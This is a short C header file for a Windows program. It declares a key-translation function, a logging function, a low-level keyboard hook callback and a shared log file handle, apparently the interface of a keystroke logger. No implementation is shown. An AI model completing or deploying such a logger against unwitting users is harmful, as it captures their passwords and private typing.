#ifndef KEYS_HANDLER_H_INCLUDED
#define KEYS_HANDLER_H_INCLUDED

#include <windows.h>
#include <stdio.h>

char *translate(int vk, int up);
void log(char *str);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
extern FILE *fd;

#endif // KEYS_HANDLER_H_INCLUDED
